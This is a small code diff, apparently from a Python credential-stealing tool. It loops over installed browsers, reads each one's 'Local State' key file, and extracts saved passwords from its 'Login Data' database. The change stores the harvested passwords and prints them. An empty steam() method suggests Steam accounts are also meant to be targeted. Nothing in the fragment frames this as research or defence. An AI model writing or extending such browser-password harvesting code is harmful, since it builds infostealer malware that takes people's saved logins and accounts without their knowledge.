@@ -24,7 +24,9 @@ class Main:
 
             if os.path.exists(browser):
                 extraction = extractor.Extract(os.path.join(browser, "Local State"))
-                extraction.extractPasswords(os.path.join(browser, "Login Data"))
+                passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
+                print(passwds)
+
 
     def steam(self):
         pass
